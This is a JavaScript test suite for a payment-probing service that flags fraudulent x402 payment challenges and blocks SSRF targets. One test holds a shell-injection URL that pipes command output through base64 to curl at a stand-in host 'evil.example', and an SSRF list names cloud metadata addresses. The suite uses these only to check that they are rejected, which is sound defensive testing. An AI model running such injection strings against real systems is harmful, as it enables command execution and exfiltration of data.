'use strict';

const { test } = require('node:test');
const assert = require('node:assert/strict');
const { probePayment, isPrivateIp } = require('../src/probe-payment');
const demo = require('../src/demo-sellers');
const { createMemoryStore } = require('../src/store');

const NOW = Date.parse('2026-09-17T10:00:00Z');

function reader() {
  return {
    endpoint: 'fake://xlayer',
    async addressState(a) {
      return { address: a, isContract: false, txCount: 57, balance: '1000000000000000000', codeSize: 0, code: '0x' };
    },
    async call() { throw new Error('no calls expected'); },
  };
}

/** fetch that serves the demo sellers in-process, as if they were deployed at https://demo.test */
function demoFetch(seen) {
  return async (url, init) => {
    const u = new URL(url);
    if (seen) seen.push((init && init.method) + ' ' + u.pathname);
    const req = { method: (init && init.method) || 'GET', headers: { host: u.host, 'x-forwarded-proto': 'https' } };
    const out = { statusCode: 200, headers: {}, body: '' };
    const res = { set statusCode(v) { out.statusCode = v; }, get statusCode() { return out.statusCode; }, setHeader(k, v) { out.headers[k.toLowerCase()] = v; }, end(b) { out.body = b || ''; } };
    if (!demo.handle(req, res, u.pathname)) { out.statusCode = 404; out.body = '{}'; }
    return new Response(out.body, { status: out.statusCode, headers: out.headers });
  };
}

const deps = (extra) => Object.assign({ store: createMemoryStore(), env: {}, now: NOW, reader: reader(), lookup: async () => [{ address: '76.76.21.21', family: 4 }], fetchImpl: demoFetch() }, extra || {});

test('probe-payment: every demo seller gets the verdict its story promises', async () => {
  for (const [key, s] of Object.entries(demo.SCENARIOS)) {
    const endpoint = 'https://demo.test/demo/x402/' + key;
    const r = await probePayment({ url: endpoint, expected: Object.assign({ endpoint }, demo.LISTING), context: { max_amount: '0.05' } }, deps());
    assert.equal(r.verdict, s.expect, key + ': ' + JSON.stringify(r.reasons));
    assert.equal(r.details.probe.contacted, true);
  }
});

test('probe-payment: the demo scenarios fire the specific rules', async () => {
  const run = async (key) => {
    const endpoint = 'https://demo.test/demo/x402/' + key;
    return (await probePayment({ url: endpoint, expected: Object.assign({ endpoint }, demo.LISTING) }, deps())).reasons;
  };
  assert.ok((await run('price-bait')).includes('amount_above_listing'));
  assert.ok((await run('payee-swap')).includes('payto_poisoning'));
  assert.ok((await run('fake-token')).includes('asset_lookalike'));
  assert.ok((await run('wrong-domain')).includes('eip712_domain_mismatch'));
  assert.ok((await run('field-injection')).includes('challenge_field_injection'));
});

test('probe-payment: URL with shell syntax is DENY and never contacted', async () => {
  const r = await probePayment({ url: 'https://demo.test/api/market-insight;id|{base64,-w0}|{curl,-fsS,https://evil.example}' }, deps({ fetchImpl: async () => { throw new Error('must not fetch'); }, lookup: async () => { throw new Error('must not resolve'); } }));
  assert.equal(r.verdict, 'DENY');
  assert.deepEqual(r.reasons, ['endpoint_url_injection']);
  assert.equal(r.details.probe.contacted, false);
});

test('probe-payment: SSRF targets are rejected before any request', async () => {
  const never = deps({ fetchImpl: async () => { throw new Error('must not fetch'); } });
  const bad = ['http://example.com/paid', 'https://localhost/paid', 'https://127.0.0.1/paid', 'https://10.0.0.5/paid', 'https://169.254.169.254/latest/meta-data', 'https://[::1]/paid', 'https://user:pw@example.com/paid', 'https://2130706433/paid', 'https://metadata.internal/x', 'ftp://example.com/x'];
  for (const url of bad) {
    await assert.rejects(probePayment({ url }, never), (e) => e.name === 'ValidationError', url);
  }
  await assert.rejects(probePayment({ url: 'https://rebind.example/paid' }, deps({ lookup: async () => [{ address: '192.168.1.10', family: 4 }], fetchImpl: async () => { throw new Error('must not fetch'); } })), /private address/);
  await assert.rejects(probePayment({ url: 'https://rebind6.example/paid' }, deps({ lookup: async () => [{ address: '::ffff:127.0.0.1', family: 6 }], fetchImpl: async () => { throw new Error('must not fetch'); } })), /private address/);
});

test('probe-payment: private address classifier', () => {
  for (const ip of ['10.1.2.3', '172.16.0.1', '192.168.0.1', '127.0.0.1', '169.254.1.1', '100.64.0.1', '0.0.0.0', '::1', 'fd00::1', 'fe80::1', '::ffff:10.0.0.1']) assert.equal(isPrivateIp(ip), true, ip);
  for (const ip of ['76.76.21.21', '8.8.8.8', '2606:4700:4700::1111']) assert.equal(isPrivateIp(ip), false, ip);
});

test('probe-payment: endpoint without a challenge returns verdict null', async () => {
  const r = await probePayment({ url: 'https://free.example/data', method: 'GET' }, deps({ fetchImpl: async () => new Response('{"ok":true}', { status: 200, headers: { 'content-type': 'application/json' } }) }));
  assert.equal(r.verdict, null);
  assert.equal(r.details.probe.challenge_found, false);
});

test('probe-payment: rate limit per caller', async () => {
  const store = createMemoryStore();
  const d = deps({ store, reporter: 'r1' });
  const endpoint = 'https://demo.test/demo/x402/honest';
  const limit = require('../src/probe-payment').RATE_LIMIT_PER_HOUR;
  for (let i = 0; i < limit; i++) await store.command('INCRBY', 'probe:rl:r1:' + Math.floor(NOW / 3600000), 1);
  await assert.rejects(probePayment({ url: endpoint }, d), (e) => e.status === 429);
});

test('HTTP: /pay-safe page, /demo/x402 catalogue and /trust-scan are served', async () => {
  const handler = require('../api/index');
  const http = require('node:http');
  const server = http.createServer(handler).listen(0, '127.0.0.1');
  await new Promise((r) => server.once('listening', r));
  const base = 'http://127.0.0.1:' + server.address().port;
  try {
    const page = await fetch(base + '/pay-safe');
    assert.equal(page.status, 200);
    assert.match(await page.text(), /Pay-Safe/);
    const cat = await (await fetch(base + '/demo/x402')).json();
    assert.equal(cat.scenarios.length, Object.keys(demo.SCENARIOS).length);
    const seller = await fetch(base + '/demo/x402/honest');
    assert.equal(seller.status, 402);
    assert.ok(seller.headers.get('payment-required'));
    const scan = await fetch(base + '/trust-scan');
    assert.equal(scan.status, 200);
    assert.ok((await scan.json()).totals);
    const bad = await fetch(base + '/probe-payment', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ url: 'https://127.0.0.1/x' }) });
    assert.equal(bad.status, 400);
  } finally {
    server.close();
  }
});
